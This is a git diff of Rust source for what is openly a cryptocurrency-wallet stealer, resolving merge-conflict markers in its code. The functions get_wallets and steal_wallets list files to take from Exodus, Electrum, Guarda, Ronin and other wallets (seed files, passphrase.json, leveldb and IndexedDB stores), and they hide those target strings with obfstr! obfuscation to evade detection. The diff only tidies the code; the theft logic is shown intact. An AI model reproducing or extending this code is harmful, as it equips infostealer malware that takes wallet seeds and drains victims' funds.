@@ -41,11 +41,7 @@ fn get_wallets() -> Vec<WalletInfo> {
                 obfstr!("exodus.wallet").to_string(),
                 obfstr!("seed.seco").to_string(),
                 obfstr!("info.seco").to_string(),
-<<<<<<< HEAD
                 obfstr!("passphrase.json").to_string(),
-=======
-                obfstr!("passphrase.json").to_string()
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             ],
         },
         WalletInfo {
@@ -58,11 +54,7 @@ fn get_wallets() -> Vec<WalletInfo> {
                 obfstr!("LOG").to_string(),
                 obfstr!("MANIFEST-*").to_string(),
                 obfstr!("*.log").to_string(),
-<<<<<<< HEAD
                 obfstr!("*.ldb").to_string(),
-=======
-                obfstr!("*.ldb").to_string()
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             ],
         },
         WalletInfo {
@@ -71,11 +63,7 @@ fn get_wallets() -> Vec<WalletInfo> {
             path_roaming: None,
             files_to_steal: vec![
                 obfstr!("Local Storage").to_string(),
-<<<<<<< HEAD
                 obfstr!("IndexedDB").to_string(),
-=======
-                obfstr!("IndexedDB").to_string()
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             ],
         },
         WalletInfo {
@@ -84,25 +72,14 @@ fn get_wallets() -> Vec<WalletInfo> {
             path_roaming: Some(obfstr!(r"Electrum\wallets").to_string()),
             files_to_steal: vec![
                 obfstr!("default_wallet").to_string(),
-<<<<<<< HEAD
                 obfstr!("wallet_*").to_string(),
-=======
-                obfstr!("wallet_*").to_string()
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             ],
         },
         WalletInfo {
             name: obfstr!("Guarda").to_string(),
             path_local: None,
             path_roaming: Some(obfstr!(r"Guarda\Local Storage\leveldb").to_string()),
-<<<<<<< HEAD
             files_to_steal: vec![obfstr!("*.ldb").to_string(), obfstr!("*.log").to_string()],
-=======
-            files_to_steal: vec![
-                obfstr!("*.ldb").to_string(),
-                obfstr!("*.log").to_string()
-            ],
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
         },
         WalletInfo {
             name: obfstr!("Ronin").to_string(),
@@ -110,11 +87,7 @@ fn get_wallets() -> Vec<WalletInfo> {
             path_roaming: None,
             files_to_steal: vec![
                 obfstr!("Local Storage").to_string(),
-<<<<<<< HEAD
                 obfstr!("IndexedDB").to_string(),
-=======
-                obfstr!("IndexedDB").to_string()
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
             ],
         },
     ]
@@ -124,11 +97,7 @@ fn get_wallets() -> Vec<WalletInfo> {
 pub fn steal_wallets() -> Vec<WalletData> {
     let mut stolen_wallets = Vec::new();
 
-<<<<<<< HEAD
     let wallets = get_wallets(); // Obtener wallets ofuscadas
-=======
-    let wallets = get_wallets();  // Obtener wallets ofuscadas
->>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
     for wallet_info in &wallets {
         if let Some(wallet_data) = steal_single_wallet(wallet_info) {
             stolen_wallets.push(wallet_data);
